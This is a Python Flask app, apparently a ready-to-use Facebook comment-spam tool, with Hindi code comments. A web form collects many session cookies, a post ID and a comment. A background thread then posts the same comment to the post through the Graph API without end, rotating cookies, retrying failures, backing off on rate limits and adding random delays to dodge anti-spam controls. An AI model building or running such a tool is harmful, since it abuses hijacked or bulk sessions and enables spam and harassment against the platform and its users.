from flask import Flask, request, render_template_string
import os
import threading
import time
import requests
import random

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

COOKIE_FILE = os.path.join(DATA_DIR, "cookies.txt")
POST_FILE = os.path.join(DATA_DIR, "post_id.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comment.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

def save_data(cookies, post_id, comment_text, delay):
    with open(COOKIE_FILE, "w") as f:
        f.write(cookies.strip())
    with open(POST_FILE, "w") as f:
        f.write(post_id.strip())
    with open(COMMENT_FILE, "w") as f:
        f.write(comment_text.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

def send_comments():
    try:
        with open(COOKIE_FILE, "r") as f:
            cookies_list = f.read().strip().splitlines()
        with open(POST_FILE, "r") as f:
            post_id = f.read().strip()
        with open(COMMENT_FILE, "r") as f:
            comment_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not (post_id and comment_text):
            print("[!] Missing required data.")
            return

        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        headers = {'User-Agent': 'Mozilla/5.0'}

        while True:
            # Cookies से ट्राय करेगा
            for cookie in cookies_list:
                for attempt in range(3):  # हर Cookie के लिए 3 बार ट्राय करेगा
                    cookie_header = {'cookie': cookie, 'User-Agent': 'Mozilla/5.0'}
                    payload = {'message': comment_text}
                    response = requests.post(url, data=payload, headers=cookie_header)

                    if response.ok:
                        print(f"[+] Cookie से कमेंट हुआ: {comment_text}")
                        break
                    else:
                        print(f"[x] Cookie फेल हुआ (#{attempt + 1}): {response.status_code}")
                        if response.status_code == 429:
                            print("[!] Rate Limit लगी है, 10 मिनट रुक रहे हैं...")
                            time.sleep(600)  # Rate Limit हो तो 10 मिनट रुकना
                            continue
                        time.sleep(15)  # फेल होने पर 15 सेकंड का डिले

                # Random Delay हर कमेंट के बाद (300 से 600 सेकंड)
                random_delay = random.randint(300, 600)
                print(f"[*] अगला कमेंट {random_delay} सेकंड बाद...")
                time.sleep(random_delay)

            print("[*] सभी Cookies इस्तेमाल हो गईं, फिर से शुरू कर रहे हैं...")
            time.sleep(780)  # हर राउंड के बाद 13 मिनट का ब्रेक

    except Exception as e:
        print(f"[!] Error: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Created by Raghu ACC Rullx</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; margin: 10px 0 5px; }
        input, textarea { padding: 10px; border: 1px solid #444; background: #222; color: white; margin-bottom: 10px; }
        button { background-color: #00ffcc; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #00cc99; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Created by Raghu ACC Rullx</h1>
        <form action="/" method="post">
            <label>Enter Cookies (One per line):</label>
            <textarea name="cookies" rows="4" required></textarea>

            <label>Enter Post ID:</label>
            <input type="text" name="post_id" required>

            <label>Enter Comment Text:</label>
            <input type="text" name="comment_text" required>

            <label>Delay in Seconds (Default 5):</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit Your Details</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        cookies = request.form.get("cookies", "").strip()
        post_id = request.form.get("post_id")
        comment_text = request.form.get("comment_text")
        delay = int(request.form.get("delay", 5))

        if post_id and comment_text and cookies:
            save_data(cookies, post_id, comment_text, delay)
            threading.Thread(target=send_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
